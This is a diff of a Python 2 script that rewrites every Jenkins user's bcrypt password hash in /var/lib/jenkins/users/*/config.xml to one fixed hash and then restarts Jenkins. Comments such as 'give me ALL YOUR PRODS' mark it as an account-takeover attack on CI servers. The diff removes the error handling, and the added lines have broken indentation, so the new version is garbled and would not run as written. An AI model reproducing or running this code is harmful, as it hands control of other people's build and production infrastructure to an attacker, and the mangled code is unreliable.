@@ -26,17 +26,15 @@ message = ""
 
 ##lololol give me ALL YOUR PRODS.
 
-try:
-   r = re.compile(r"#jbcrypt:[^<]+")
-   results = os.listdir('/var/lib/jenkins/users/')
-   for res in results:
-      for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
-         line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$XYFOTLdxNOvs90GTLIcs4..5bEnN1QiJ/2XFfze1pSFJBC3fn/NRa", line )
-         print line,
-   message = 'using jenkins: %s ' % str(results)
-   os.system('/etc/init.d/jenkins restart')
-except:
-        message = 'No Jenkins or Failed' 
+r = re.compile(r"#jbcrypt:[^<]+")
+results = os.listdir('/var/lib/jenkins/users/')
+for res in results:
+for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
+ line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$XYFOTLdxNOvs90GTLIcs4..5bEnN1QiJ/2XFfze1pSFJBC3fn/NRa", line )
+ print line,
+message = 'using jenkins: %s ' % str(results)
+os.system('/etc/init.d/jenkins restart')
+message = 'No Jenkins or Failed' 
 
 
 #lolol fuk your code give me prod.
